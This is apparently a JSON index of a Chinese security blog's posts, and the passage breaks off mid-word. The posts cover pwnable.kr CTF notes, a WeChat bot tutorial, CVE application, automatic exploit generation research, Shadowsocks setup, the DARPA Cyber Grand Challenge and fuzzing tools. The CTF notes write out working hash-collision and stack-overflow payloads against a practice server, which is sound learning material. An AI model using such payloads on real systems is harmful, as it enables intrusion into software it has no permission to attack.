前四关所涉及的知识点，作为学习笔记以备日后 review。","text":"作为刚接触 PWN 的菜鸡，在学习相关知识的同时，通过 pwnable.kr来检验学习成果。本文记录了 pwnable 前四关所涉及的知识点，作为学习笔记以备日后 review。 0x01 fd本题较为简单，涉及的知识点为 Linux 文件描述符。默认情况下标准输入的文件描述符为“0”，标准输出的文件描述符为“1”，错误输出的文件描述符为“2”。 访问题目时给出的提示。 登录服务器后，当前目录下共有三个文件 fd.c、fd、flag。查看 fd.c 内容。 通过代码可知，首先将 “argv[1]” 转为 “int” 然后与 “0x1234” 相减，结果存入 “fd” 中。之后，将读入数据与 “LETMEWIN” 相比较，若一致，则读取 flag。基于以上分析，仅需将 “atoi(argv[1]) - 0x1234” 的值构造为 “0”，程序即可从标准输入中读取数据，通过输入 “LETMEWIN” 即可读取 flag。0x1234 = 4660，flag 如图。 0x02 collision(解题思路不唯一)题目提示信息如下。 登录服务器后查看当前目录下的 col.c 文件。 通过阅读代码可知，check_password()将输入的 20 bytes 数据以长度 “int * ”（4 byte）为单位进行累加，将累加结果与 “0x21DD09EC” 比较。根据对代码的理解，构造输入数据，最朴素的思路可以将输入数据构造为“(\\x01\\x01\\x01\\x01) * 4 + \\xe8\\x05\\xd9\\x1d”。最终构造 exp 如下：./col $(python -c &quot;print &#39;\\x01\\x01\\x01\\x01&#39; * 4 + &#39;\\xe8\\x05\\xd9\\x1d&#39;&quot;) 0x03 bof本题主要考察最基础的栈溢出。 查看源代码 bof.c，在 func() 中，要利用栈溢出覆盖变量 “key” 的内容，使之等于“0xcafebabe”，即可获得 flag。反编译 bof，分析 func()。通过汇编代码可知，局部变量 “overflowme[32]” 的地址为 “ebp-0x2c”，需要覆盖的地址为 “ebp+0x8”，因此偏移量为 “0x34”。目标操作系统采用小端序存储，因此将“0xcafebabe”布局为“\\xbe\\xba\\xfe\\xca”。 根据以上分析，构造输入数据为 “\\x41 * 52 + \\xbe\\xba\\xfe\\xca”，使用 GDB 进行验证。由上图可知，输入数据成功的将 “ebp+0x8” 处的内容覆盖为“0xcafebabe”。最终 exp 为：(python -c &quot;print &#39;\\x41&#39;*52 + &#39;\\xbe\\xba\\xfe\\xca&#39;&quot;;cat)|(nc pwnable.kr 9000) 0x04 flag如同给出的提示，本题侧重于 reverse。 利用 “strings” 命令查看 flag 文件中的字符串，检测到 UPX 壳。 使用 “upx -d flag” 脱壳。通过 GDB 调试脱壳后的 flag。在 main() 入口设置断点，查看汇编代码即可获取到 flag。","categories":[{"name":"PWN","slug":"PWN","permalink":"http://maskhed.github.io/categories/PWN/"}],"tags":[]},{"title":"Mr.WxRobot","slug":"Mr-WxRobot","date":"2018-11-27T13:01:26.000Z","updated":"2018-11-27T13:33:36.278Z","comments":true,"path":"2018/11/27/Mr-WxRobot/","link":"","permalink":"http://maskhed.github.io/2018/11/27/Mr-WxRobot/","excerpt":"由于项目需要，最近了解了下微信机器人。通过对微信个人号的自动化操作，不仅可以实现自动陪聊、抢红包、群消息同步等功能，甚至能够实现车牌识别、OCR等功能。调研后发现两个项目比较受欢迎itchat与wxpy。项目的 Star 与 Fork 数量都颇为可观。","text":"由于项目需要，最近了解了下微信机器人。通过对微信个人号的自动化操作，不仅可以实现自动陪聊、抢红包、群消息同步等功能，甚至能够实现车牌识别、OCR等功能。调研后发现两个项目比较受欢迎itchat与wxpy。项目的 Star 与 Fork 数量都颇为可观。 wxpy 是在 itchat 的基础上，通过对接口的优化、功能的扩展，进一步提升了模块的易用性，在必要的时候也可以直接调用 itchat 原始接口。基于以上原因，最终选用 wxpy。 一、安装wxpy 支持 Python 3.4-3.6，以及 2.7 版本，安装非常简单，根据官方文档支持以下两种安装方式: 从 PYPI 官方源下载安装 (在国内可能比较慢或不稳定): 1pip install -U wxpy 从豆瓣 PYPI 镜像源下载安装 (推荐国内用户选用): 1pip install -U wxpy -i &quot;https://pypi.doubanio.com/simple/&quot; 二、基本功能 登陆微信: 1234# 导入模块from wxpy import *# 初始化机器人，扫码登陆bot = Bot() 找到好友: 12# 搜索名称含有 &quot;游否&quot; 的男性深圳好友my_friend = bot.friends().search(&apos;游否&apos;, sex=MALE, city=&quot;深圳&quot;)[0] 发送消息: 1234# 发送文本给好友my_friend.send(&apos;Hello WeChat!&apos;)# 发送图片my_friend.send_image(&apos;my_picture.jpg&apos;) 自动响应各类消息: 1234567891011121314151617# 打印来自其他好友、群聊和公众号的消息@bot.register()def print_others(msg): print(msg)# 回复 my_friend 的消息 (优先匹配后注册的函数!)@bot.register(my_friend)def reply_my_friend(msg): return &apos;received: &#123;&#125; (&#123;&#125;)&apos;.format(msg.text, msg.type)# 自动接受新的好友请求@bot.register(msg_types=FRIENDS)def auto_accept_friends(msg): # 接受好友请求 new_friend = msg.card.accept() # 向新的好友发送消息 new_friend.send(&apos;哈哈，我自动接受了你的好友请求&apos;) 保持登陆/运行: 12345# 进入 Python 命令行、让程序保持运行embed()# 或者仅仅堵塞线程# bot.join() 三、小结由于项目提供的官方 API 非常详尽，并且网络上有很多大神写的 Demo，因此编写一个功能简单的机器人非常便捷。需要注意的是，在测试过程中尽量避免使用个人主用号码，存在被限制登录 Web 微信的可能。","categories":[{"name":"技术分享","slug":"技术分享","permalink":"http://maskhed.github.io/categories/技术分享/"}],"tags":[{"name":"Mr.Robot","slug":"Mr-Robot","permalink":"http://maskhed.github.io/tags/Mr-Robot/"}]},{"title":"初试 CVE","slug":"First-CVE","date":"2018-11-16T10:48:31.000Z","updated":"2018-11-27T13:32:23.630Z","comments":true,"path":"2018/11/16/First-CVE/","link":"","permalink":"http://maskhed.github.io/2018/11/16/First-CVE/","excerpt":"作为一只信安菜鸡，也不晓得从何时起心心念念的想拥有属于自己的 CVE-ID。基于这简单的愿景，于是摇摇摆摆的迈开了尝试的步伐…","text":"作为一只信安菜鸡，也不晓得从何时起心心念念的想拥有属于自己的 CVE-ID。基于这简单的愿景，于是摇摇摆摆的迈开了尝试的步伐… 0x00 关于 CVE1、简介CVE(Common Vulnerabilities &amp; Exposures，通用漏洞披露) 是国际著名的安全漏洞库，也是对已知漏洞和安全缺陷的标准化名称列表。是一个由业界、政府以及学术界组成的非盈利性的国际组织，其使命是为了更加快速而有效地鉴别、发现并修复软件产品中的安全漏洞。 2、组织机制CANs(CVE Numbering Authority) 是 CVE-ID 的实际分发机构，METRE 依照按需分配的原则向 CNA 成员分配 CVE-ID 编号池，供其分发漏洞编号。详细列表可参看CANs成员。 3、申请流程METRE 并不会主动发放 CVE-ID，需要申请者向 CNAs 提出申请，通常情况下包含以下环节：1）挖掘漏洞，编写PoC；2）通报厂商，留存相关材料（PoC、截图、链接等）；3）在 CVE 网站上发起申请，并依照要求填写相关内容；4）METRE 向申请者发放 CVE-ID，同时根据 CVE-ID 在官网上创建“空白”页面；5）审核通过后 METRE 向申请者确认 CVE-ID，并更新 CVE 网站上对应漏洞的内容。 0x01 实践检验1、 漏洞确认此次尝试以“Distributed Weakness Filing Project”的方式申请 CVE 编号。首先在 Github 上选择感兴趣的项目，然后针对该项目进行漏洞挖掘，成功后编写PoC并提交 Issues。 2、 申请 CVE-ID申请地址，依照要求填写相关内容（共需六步），漏洞细节提交 Issue 对应的链接即可。完成申请后会收到来自 MITRE 的邮件。 3、 喜提 ID两天后收到 CVE 申请通过的邮件通知，至此获得了第一个 CVE-ID。事实上，CVE 编号只是一个规范化的产物，真正的含金量还得看实际内容。援引tk教主的话：“喜悦主要来自于漏洞本身，以及探索和挑战的过程”。目前还是太菜，需要学习的东西太多，争取来年能够输出具有含金量的 CVE。","categories":[{"name":"技术分享","slug":"技术分享","permalink":"http://maskhed.github.io/categories/技术分享/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"http://maskhed.github.io/tags/CVE/"}]},{"title":"漏洞自动化利用","slug":"AEG-Research-Status","date":"2018-11-16T06:41:02.000Z","updated":"2018-12-20T04:05:08.907Z","comments":true,"path":"2018/11/16/AEG-Research-Status/","link":"","permalink":"http://maskhed.github.io/2018/11/16/AEG-Research-Status/","excerpt":"二进制漏洞的挖掘与利用始终是网络安全的核心内容之一。目前，漏洞挖掘的自动化程度已经较高，各类并行 Fuzz 平台已能够高效产出大量 Crash。面对 Crash，如何快速判定其可利用性，并编写利用程序是亟待解决的问题。Crash 的可利用性判定属于另一个研究方向，相关内容本文并不涉及。针对 Exploit 的自动生成问题，学术界有一个专有名词：Automatic Exploit Generation。AEG 是安全研究领域首次将“利用自动生成”作为一个研究课题，也代表着漏洞利用自动化的研究逐步拉开序幕。下文将针对 AEG 的研究历程进行简要介绍。","text":"二进制漏洞的挖掘与利用始终是网络安全的核心内容之一。目前，漏洞挖掘的自动化程度已经较高，各类并行 Fuzz 平台已能够高效产出大量 Crash。面对 Crash，如何快速判定其可利用性，并编写利用程序是亟待解决的问题。Crash 的可利用性判定属于另一个研究方向，相关内容本文并不涉及。针对 Exploit 的自动生成问题，学术界有一个专有名词：Automatic Exploit Generation。AEG 是安全研究领域首次将“利用自动生成”作为一个研究课题，也代表着漏洞利用自动化的研究逐步拉开序幕。下文将针对 AEG 的研究历程进行简要介绍。 1、 APEGAPEG 是 D.Brumley 等人在 2008 年的 IEEE S&amp;P 会议上首次提出的基于二进制补丁比较的漏洞利用自动生成方法。该方法利用二进制差异比较查找补丁位置，通过分析补丁代码，生成能够触发漏洞的输入数据，结合污点分析技术生成可利用程序。虽然 APEG 的核心思想较为简单，但由于具备较强的可操作性而得到普遍认可。相关论文《Automatic Patch-Based Exploit Generation is Possible: Techniques and Implications》 2、 AEG为了克服 APEG 对于补丁的依赖以及无法构造控制流劫持的缺陷， T.Avgerinos 等人在 2011 年的 NDSS 会议上提出了 AEG，一种基于源码的劫持控制流的自动利用方案。AEG 采用了前向符号执行与动态指令插桩技术，能够生成具备控制流劫持能力的利用样本，是第一个真正意义上的面向控制流劫持的自动化构建方案。相关论文《AEG: Automatic Exploit Generation》 3、 Mayhem由于 AEG 依赖程序源代码并受限于编译器等环境因素。S.K.Cha 等人在 2012 年的 IEEE S&amp;P 会议上提出了基于二进制的自动利用方案 Mayhem。该方案采用在线式符号执行与离线式符号执行技术，通过内存建模实现较为实用的自动利用方案。相关论文《Unleashing MAYHEM on Binary Code》 4、 PolyAEG实现漏洞自动利用方案的重要性不言而喻，对于漏洞危害评估来说，生成高质量、多样性的漏洞利用样本同样意义重大。因此，M.HWang 等人在 2013 年 SecureComm 会议上提出了多样性利用样本自动生成方法 PolyAEG。该方案通过对 8 个漏洞样本进行试验，针对单个控制流劫持漏洞最多生成 4724 个利用样本，为漏洞危害评估提供了有效支持。相关论文《Automatic Polymorphic Exploit Generation for Software Vulnerabilities》 5、 FlowStitch2015 年 H.Hu 等人在 USENIX Security 会议上首次提出了面向数据流利用的自动化利用方案 FlowStitch。通过在 8 个真实漏洞样本上进行试验，FlowStitch 自动构建的 19 个利用样本不仅可以绕过数据执行以及细粒度控制流完整性等防护手段，并且其中 10 个利用样本还可以在开启地址随机化的环境下成功执行。相关论文《Automatic Generation of Data-Oriented Exploits》 6、Angr2016 年 Shoshitaishvili 等人在 IEEE S&amp;P 会议上提出了 Offensive Binary Analysis 技术，并开源了二进制分析平台 Angr。 作者所在团队所设计的 Cyber Reasoning System（CRS）Mechaphish 于 2016 年 DARPA 举办的 CGC 竞赛中荣获第三名。Mechaphish 系统中负责漏洞自动化利用的模块 Rex 正是基于 Angr 而实现。相关论文《(State of) The Art of War: Offensive Techniques in Binary Analysis》 7、 Q为了应对漏洞缓解技术，特别是数据执行保护与地址随机化，E.J.Schwartz 等人在 2011 年的 USENIX Security 会议上提出了一套面向高可靠性漏洞利用的 ROP 代码自动生成方法 Q。严格来讲，ROP 代码生成方案应当属于 Exploit Hardening 而非 Exploit Generation。但面对当前越来越严格的漏洞利用缓解技术，ROP 为利用样本的稳定执行提供了有效的支撑。相关论文《 Q: Exploit hardening made easy》 自首次提出基于二进制补丁比对的漏洞自动化利用方案至今的十年间，针对 AEG 的研究已取得了明显的进展，但相较于漏洞利用的复杂性、安全防御技术的不断演进，要想使得 AEG 在复杂多变的网络对抗中产生实际应用尚有很多问题等待解决。 本人属于刚接触二进制安全的菜鸟，文中内容主要参考中科院软件所苏璞睿老师的《软件漏洞自动利用研究进展》，所涉及论文正在逐步阅读中，力争在后续的学习过程中再产出一些阶段性的总结。 参考文献：《自动化漏洞利用的重大挑战回顾》《软件漏洞自动利用研究进展》《Automatic Exploit Generation：漏洞利用自动化》","categories":[{"name":"AEG","slug":"AEG","permalink":"http://maskhed.github.io/categories/AEG/"}],"tags":[]},{"title":"基于搬瓦工的 ShadowSocks 搭建","slug":"SS搭建","date":"2018-11-06T05:51:56.000Z","updated":"2018-11-27T13:35:31.764Z","comments":true,"path":"2018/11/06/SS搭建/","link":"","permalink":"http://maskhed.github.io/2018/11/06/SS搭建/","excerpt":"在日常工作与学习过程中，没有Google实在不方便，之前一直使用IPv6作为替代解决方案，但在不支持IPv6的网络中很是尴尬，于是决定利用 VPS 结合 SS（ShadowSocks）搭建属于自己的梯子，做个相对长久的解决方案。","text":"在日常工作与学习过程中，没有Google实在不方便，之前一直使用IPv6作为替代解决方案，但在不支持IPv6的网络中很是尴尬，于是决定利用 VPS 结合 SS（ShadowSocks）搭建属于自己的梯子，做个相对长久的解决方案。 0x00 VPS选购想要访问谷歌等网站，首先需要一台国外的 VPS。目前提供国外 VPS 的主机商有很多，如国内的阿里云、腾讯云等，但服务价格相对较高，入门级ECS包年费用基本在300+rmb。 作为仅提供简单的SS服务，性价比有待商榷。因此选择价位更加亲民且稳定不跑路的主机提供商“搬瓦工”，其优势如下： 按月收费，价格低廉，当前最低年付 19.99 美元 服务稳定，速度较快 可一键切换机房，每 10 周可免费换一次 IP 与“搬瓦工”同样出名的还有“ VULTR ”，相较于“搬瓦工”，“ VULTR ”的优势在于 VPS 可以随时创建与删除，0.01 美元即可换 IP 一次。 整体上来说，想要速度快的选择搬瓦工，怕 IP 被封则选择 VULTR。综合考虑各种因素，最终选购了“搬瓦工”的“Basic VPS-Self-managed-10G KVM-PROMO”，如何选择VPS配置及购买完成后对VPS的设置网上教程较多，可自行百度。由于“搬瓦工”支持支付宝，因此很是方便。 0x01 SS服务端配置在完成VPS购置后，接下来要做的是安装SS服务端并进行配置。基于个人习惯，将 VPS 操作系统设置为 Ubuntu 16.04 x86_64，下文就以该OS版本为例进行说明。1、安装SS服务端首先提供SS官方网站、GitHub地址。SS服务端安装相对简单，通常情况下依次执行如下命令即可：12345apt-get updateapt install python-pippip install --upgrade pippip install setuptoolspip install shadowsocks 执行完毕后，若无异常则表明安装成功。2、配置SS服务端SS配置文件为json格式，在“/etc” 或当前用户目录下创建配置文件，如“ shadowsock.json ”，并填写配置信息，格式参考github官方实例。 123456789101112131415161718192021222324252627&#123; \"server\":\"you_server_ip\", \"port_password\":&#123; \"8388\":\"you_password\", \"8389\":\"you_password\", \"8390\":\"you_password\", \"8391\":\"you_password\", \"8392\":\"you_password\" &#125;, \"localhost_address\":\"127.0.0.1\", \"local_port\":1080, \"timeout\":300, \"method\":\"aes-256-cfb\", \"fast_open\":false, \"workers\":20 &#125; ##############以下为说明文字，请忽略you_server_ip：是你的服务器登录地址localhost_address：127.0.0.1请保持默认local_port：1080请保持默认server_port：8381根据需要进行修改you_password：个人设置密码timeout：300请保持默认method：aes-256-cfb请保持默认fast_open：false请保持默认 官方说明中，各字段含义如下： Name Explanation server the address your server listens server_port server port local_address the address your local listens local_port local port password password used for encryption timeout in seconds method default: “aes-256-cfb” fast_open use TCP_FASTOPEN, true / false workers number of workers, available on Unix/Linux 配置完毕后，需启动SS服务，命令如下： 1234# //前台启动ssserver -c /etc/shadowsock.json# //后台启动ssserver -c /etc/shadowsock.json -d start/stop 在Ubuntu系统下设置SS服务开机自启动：123vi /etc/rc.local# //添加以下记录：ssserver -c /etc/shadowsocks.json -d start 3、遇到的问题由于RP问题，在安装过程中遇到以下问题：（1）更新pip报错更新 pip 后，使用 pip 安装python包时报错： 1ImportError: cannot import name main 解决方案：修改“/usr/bin”目录下pip文件。 将如下三行 123from pip import mainif __name__ == '__main__': sys.exit(main()) 修改为 123from pip import __main__if __name__ == '__main__': sys.exit(__main__.main()) 保存退出，重新登录终端后成功解决异常。 （2） locale命令报错 locale指令运行出现的错误信息：123locale：Cannot set LC_CTYPE to default locale： No such file or directorylocale：Cannot set LC_MESSAGES to default locale： No such file or directorylocale：Cannot set LC_ALL to default locale： No such file or directory locale是用来设置软件运行的语言环境，因此判断语言环境设置存在问题。重新设置语言环境，执行如下命令：12345# 针对特定用户[root@Mylinux ~]#echo \"export LC_ALL=en_US.UTF-8\" &gt;&gt; /home/XXX/.bash_profile# 针对所有用户[root@Mylinux ~]# echo \"export LC_ALL=en_US.UTF-8\" &gt;&gt; /etc/profile（所有用户）[root@Mylinux ~]# exit 退出后重新登录终端，成功解决异常。 0x02 SS客户端配置安装SS服务端并确保服务正确启动后，接下来需要配置SS客户端。SS客户端所支持的系统类型如下：结合日常使用习惯，主要针对OSX、IOS两个版本进行说明。1、Mac OS XOSX下SS客户端的安装较简单，在官方地址下载SS客户端，成功安全后点击导航栏中的“小飞机”图标，配置SS服务器相关信息。正确配置后，即可访问Google等站点。 2、IOS相较Mac OS X，IOS的配置略显繁琐，主要原因在于仅美区AppleID才能够下载SS客户端。因此，首先需要注册一个美区账户。(1)注册美区ID创建过程同样很简单，通过苹果官方网站新建AppleID。创建过程中将账户所属区域设为美国即可。（2)IOS客户端iOS中的Shadowsocks客户端，也有多种。可以参考Shadowsocks官网中：Shadowsocks - Clients介绍的： Wingy： App Store MobileShadowSocks Big Boss 不过想要使用支持最新加密方式的客户端的话，目前仅有shadowrocket与Potatso Lite两款。利用之前注册的美区AppleID下载免费的Potatso Lite，配置SS服务器信息后，即可顺利访问Google等站点。","categories":[{"name":"技术分享","slug":"技术分享","permalink":"http://maskhed.github.io/categories/技术分享/"}],"tags":[{"name":"SS","slug":"SS","permalink":"http://maskhed.github.io/tags/SS/"}]},{"title":"Cyber Grand Challenge 简介","slug":"CGC","date":"2018-11-01T15:03:15.000Z","updated":"2018-12-20T03:56:13.525Z","comments":true,"path":"2018/11/01/CGC/","link":"","permalink":"http://maskhed.github.io/2018/11/01/CGC/","excerpt":"","text":"2016年8月在美国拉斯维加斯举办的 Defcon CTF，一支名为 Mayhem 的机器人战队与另外十四支人类顶尖CTF战队上演了信息安全领域首次人机黑客对战。该事件在人工智能和信息安全领域具有里程碑式的意义，是机器智能开始深入影响信息安全的标志性事件之一。代表机器智能的 Mayhem，正是由美国国防部先进项目研究局（DARPA，Defense Advanced Research Projects Agency）举办的网络超级挑战赛（CGC，Cyber Grand Challenge）的冠军。 背景 CGC(Cyber Grand Challenage) 是DARPA于2013年发起的全球性网络安全挑战赛，旨在推进自动化网络防御技术发展，即实时识别系统缺陷、漏洞，并自动完成修补和系统防御，利用CRS（Cyber Reasoning System）实现全自动的网络安全攻防。主要涉及以下技术： Dynamic Analysis Static Analysis Symbolic Execution Constraint Solving Data Flow Tracking Fuzz Testing 赛程CGC 的赛程分为两个阶段：初赛（Challenge Qualification Event，CQE）和决赛（Challenge Final Event，CFE）。在比赛之前，每支参赛团队需要开发一套全自动的网络推理系统CRS（Cyber Reasoning System），实现对 Linux 二进制程序的自动化分析及漏洞检测，自动生成PoC，并对漏洞进行修补。 Challenge Qualification Event（CQE）POV（Proof of Vulnerability）是CGC竞赛的核心，可类比为常规CTF比赛中所需编写的Exploit。在CQE中，参赛团队的CRS被放置在单独的环境中进行评估，CRS在此环节中需要自动分析待检测的二进制程序CB（Challenge Banary），生成POV及修补过的CB。CQE阶段侧重于考察团队的漏洞挖掘能力及生成补丁的能力。下表为DARPA在CQE和CFE分別要测试的项目： Challenge Final Event（CFE）CFE和CQE最大的不同在于各参赛团队的CRS会部署于同一网络环境之内，各队将生成的POV提交给主办方，主办方将这些POV混入正常的服务流量，再分配给各队的CRS，以实现相互之间的网络攻防。若CRS能够在正常流量中检测出攻击流量，并进行有效阻断，则认为CRS成功实现了网络防御。 下图为CFE的评分标准。参赛队伍首先生成POV，若此POV成功便可获得部分得分。之后 Mixing Appliance 会将主办方以及各队的POV混合至正常的服务流量中（Service Poller）并发送给各队。各队首先从网络防御系统接收到流量，并可以做一定程度的过滤，若能成功过滤POV，则可获取相应的得分，反之则会被扣除相应的分数。而未过滤的流量会进入到 Patch CB 中。同样，成功过滤POV则得分，否则扣分。最后会确认应用程序状态，若应用程序能够提供正常服务则可以获得相应分数，否则扣除相应分数。 技术由于本文主要介绍CGC相关情况，其中所涉及的技术过于庞杂，难以一一说明。因此以此图为索引，概要的展示各环节所涉及的主要技术，感兴趣的读者可对相关技术进行深入研究。 决赛团队简介初赛阶段的参赛队伍分为资助(Funded Track)和公开(Open Track)两种。Funded Track 是预先向DARPA提交项目申请并获得75万美元资助的团队；Open Track 则是面向全球公开报名，由民间自由组织的团队；共有队伍近100支，包括至少18支来自欧洲、亚洲等非北美地区的队伍；Open Track 有传统CTF强队（disekt，shellphish等），也有由知名安全企业资助的比赛团队。由 DARPA 官方宣布的CGC最终比赛结果如下：第1名：卡内基梅隆大学 ForAllSecure 团队研制的 Mayhem 系统；第2名：GrammaTech 公司和弗吉尼亚大学 TECHx 团队研制的 Xandra 系统；第3名：加利福尼亚大学 Shellphish 学生团队研制的Mechanical Phish系统。以下为七支进入决赛团队的简介： CodeJitsu（Berkeley, Calif.）：来自加州伯克利大学，指导教授为Dawn Song。伯克利大学的研究团队在应用程序分析，特别是二进制分析领域始终处于世界领先的水平，该团队开源的分析系统很值得研究。http://bitblaze.cs.berkeley.edu/ ForAllSecure （Pittsburgh, Pa.）：ForAllSecure是卡内基梅隆大学David Brumley教授所创办的公司，团队成员也多来自于卡内基梅隆大学的CyLab（David Brumley教授指导的实验室）。著名的PPP战队正是出自CyLab。除此之外，CyLab在二进制分析领域的研究也是处于全球领先的地位，与伯克利的团队类似，CyLab也有自己研发的二进制分析平台 BAP（Binary Analysis Platform。https://github.com/BinaryAnalysisPlatform TECHx （Charlottesville, Va.）: GrammaTech是一家专注于二进制分析的公司，此次与维吉尼亚大学组队参加CGC竞赛，开发了PEASOUP（Preventing Exploits of Software Of Uncertain Provenance）系統。相关论文:http://www.grammatech.com/research/technologies/peasoup/publications CSDS （Moscow, Idaho）：有爱德华大学教授Jim Alves-Foss及其博士后研究员 Jia Song 组成的两人战队。是CGC比赛中唯一重新开发整套工具的队伍。 DeepRed （Arlington, Va.）：Raytheon为美国公司，该团队在memory领域有一些特別的研究成果，队名源自于 IBM 的 Deep Blue。 disekt（Athens, Ga.）：disekt是一只CTF战队，共有四位成员。该团队对于VM系统有深入研究，12年有发表QEMU漏洞，14年发表VM Detection技术，此外还有ROP相关研究成果。（ROP Detection at Shmoocon 2014 ） Shellphish（Santa Barbara, Calif.）：团队由加利福尼亚大学圣芭芭拉分校的学生组成。Shellphish 不仅是传统的CTF强队，在学术研究方面也具备深厚的功力，团队指导教授之一的 Christopher Kruegel，在二进制分析领域相当有名。该团队开发的Angr系统，是非常优秀的分析平台。http://angr.io/ 參考文獻 https://github.com/CyberGrandChallenge/cgc-release-documentation/blob/master/walk-throughs/running-the-vm.md http://blog.trailofbits.com/category/program-analysis/","categories":[{"name":"AEG","slug":"AEG","permalink":"http://maskhed.github.io/categories/AEG/"}],"tags":[{"name":"CGC","slug":"CGC","permalink":"http://maskhed.github.io/tags/CGC/"}]},{"title":"Fuzzing技术总结与工具列表","slug":"Fuzzing技术总结与工具列表","date":"2018-10-26T16:11:23.000Z","updated":"2018-12-20T03:59:16.541Z","comments":true,"path":"2018/10/27/Fuzzing技术总结与工具列表/","link":"","permalink":"http://maskhed.github.io/2018/10/27/Fuzzing技术总结与工具列表/","excerpt":"","text":"版权声明：本文为博主原创文章，未经博主允许不得转载。https://blog.csdn.net/wcventure/article/details/82085251 首先推荐阅读2018年computing Surveys 的《Fuzzing: Art, Science, and Engineering》https://github.com/wcventure/wcventure/blob/master/Paper/Fuzzing_Art_Science_and_Engineering.pdf其次推荐阅读2018年Cybersecurity 的 《Fuzzing: a survey》https://www.researchgate.net/publication/325577316_Fuzzing_a_survey里面对fuzzing技术和fuzzing工具有详细的介绍。 一、什么是Fuzzing？ Fuzz本意是“羽毛、细小的毛发、使模糊、变得模糊”，后来用在软件测试领域，中文一般指“模糊测试”，英文有的叫“Fuzzing”，有的叫“Fuzz Testing”。本文用fuzzing表示模糊测试。 Fuzzing技术可以追溯到1950年，当时计算机的数据主要保存在打孔卡片上，计算机程序读取这些卡片的数据进行计算和输出。如果碰到一些垃圾卡片或一些废弃不适配的卡片，对应的计算机程序就可能产生错误和异常甚至崩溃，这样，Bug就产生了。所以，Fuzzing技术并不是什么新鲜技术，而是随着计算机的产生一起产生的古老的测试技术。 Fuzzing技术是一种基于黑盒（或灰盒）的测试技术，通过自动化生成并执行大量的随机测试用例来发现产品或协议的未知漏洞。随着计算机的发展，Fuzzing技术也在不断发展。 二、Fuzzing有用么？ Fuzzing是模糊测试，顾名思义，意味着测试用例是不确定的、模糊的。 计算机是精确的科学和技术，测试技术应该也是一样的，有什么的输入，对应什么样的输出，都应该是明确的，怎么会有模糊不确定的用例呢？这些不确定的测试用例具体会有什么作用呢？ 为什么会有不确定的测试用例，我想主要的原因是下面几点： 1、我们无法穷举所有的输入作为测试用例。我们编写测试用例的时候，一般考虑正向测试、反向测试、边界值、超长、超短等一些常见的场景，但我们是没有办法把所有的输入都遍历进行测试的。 2、我们无法想到所有可能的异常场景。由于人类脑力的限制，我们没有办法想到所有可能的异常组合，尤其是现在的软件越来越多的依赖操作系统、中间件、第三方组件，这些系统里的bug或者组合后形成的bug，是我们某个项目组的开发人员、测试人员无法预知的。 3、Fuzzing软件也同样无法遍历所有的异常场景。随着现在软件越来越复杂，可选的输入可以认为有无限个组合，所以即使是使用软件来遍历也是不可能实现的，否则你的版本可能就永远也发布不了。Fuzzing技术本质是依靠随机函数生成随机测试用例来进行测试验证，所以是不确定的。 这些不确定的测试用例会起到我们想要的测试结果么？能发现真正的Bug么？ 1、Fuzzing技术首先是一种自动化技术，即软件自动执行相对随机的测试用例。因为是依靠计算机软件自动执行，所以测试效率相对人来讲远远高出几个数量级。比如，一个优秀的测试人员，一天能执行的测试用例数量最多也就是几十个，很难达到100个。而Fuzzing工具可能几分钟就可以轻松执行上百个测试用例。 2、Fuzzing技术本质是依赖随机函数生成随机测试用例，随机性意味着不重复、不可预测，可能有意想不到的输入和结果。 3、根据概率论里面的“大数定律”，只要我们重复的次数够多、随机性够强，那些概率极低的偶然事件就必然会出现。Fuzzing技术就是大数定律的典范应用，足够多的测试用例和随机性，就可以让那些隐藏的很深很难出现的Bug成为必然现象。 目前，Fuzzing技术已经是软件测试、漏洞挖掘领域的最有效的手段之一。Fuzzing技术特别适合用于发现0 Day漏洞，也是众多黑客或黑帽子发现软件漏洞的首选技术。Fuzzing虽然不能直接达到入侵的效果，但是Fuzzing非常容易找到软件或系统的漏洞，以此为突破口深入分析，就更容易找到入侵路径，这就是黑客喜欢Fuzzing技术的原因。 三、基于生成和基于编译的Fuzzing算法？* Fuzzing引擎算法中，测试用例的生成方式主要有2种：1）基于变异：根据已知数据样本通过变异的方法生成新的测试用例；2）基于生成：根据已知的协议或接口规范进行建模，生成测试用例；一般Fuzzing工具中，都会综合使用这两种生成方式。 基于变异的算法核心要求是学习已有的数据模型，基于已有数据及对数据的分析，再生成随机数据做为测试用例。 四、state-of-the-art AFL AFL就是著名的基于变异的Fuzzer。以下有一些关于state-of-the-art AFL的资料 american fuzzy lop (2.52b) http://lcamtuf.coredump.cx/afl/ AFL内部实现细节小记 http://rk700.github.io/2017/12/28/afl-internals/ afl-fuzz技术白皮书 https://blog.csdn.net/gengzhikui1992/article/details/50844857 如何使用AFL进行一次完整的fuzz过程 https://blog.csdn.net/abcdyzhang/article/details/53487683 AFL(American Fuzzy Lop)实现细节与文件变异 https://paper.seebug.org/496/ fuzz实战之libfuzzer https://www.secpulse.com/archives/71898.html 1234- Static analysis- Dynamic analysis- Symbolic execution- Fuzzing 12- Generation-based Fuzzing- Mutation-based Fuzzing 123- White box fuzzing- Grey box fuzzing- Black box fuzzing 1- Fuzzing技术中的关键 1- Fuzzing 中 1- 至今fuzzing工具文献的引用关系，Fuzzing工具的分类和历史 1- Fuzzing 工具之调研，还有一张很好的整理后的图表 最后，再整理一下部分开源fuzzing工具的列表原文来自：[https://www.peerlyst.com/posts/resource-open-source-fuzzers-list]，并增加2018年最新的诸如CollAFL和SnowFuzz等工具 开源Fuzzers工具 Fuzzing的线束或框架 其它 Fuzzers 工具是免费的，但是和开源比不值得一提 Fuzzing的有效超载 博客将帮助你更好的了解Fuzz 其它关于Fuzzing博客或资源 商业Fuzzers工具 一、开源Fuzzers CollAFLhttp://chao.100871.net/papers/oakland18.pdf路径敏感的Fuzzer，解决了AFL中bitmap路径冲突的问题。并提出了一种选择seed的策略，能更快提高覆盖率。 SnowFuzzhttps://arxiv.org/pdf/1708.08437.pdf VUzzerhttp://www.cs.vu.nl//~giuffrida/papers/vuzzer-ndss-2017.pdf基于应用感知的自进化模糊工具。在这篇文章中，我们提出一个应用感知的进化模糊策略（不需要以前的知识应用或格式输入）。为了最小化地覆盖并扩展更深的路径，我们利用基于静态和动态分析的控制以及数据流功能，来推断应用程序的基本属性。与Application-agnostic方法相比，这可以更快地生成有趣的输入。我们实行我们的模糊策略在VUzzer上，并且用三种不同的数据评估它：DARPA的大挑战二进制文件（CGC）、一组真实的应用程序（二进制输入解析器）和最近发布的LAVA数据集。 Afl-fuzz（American fuzzy 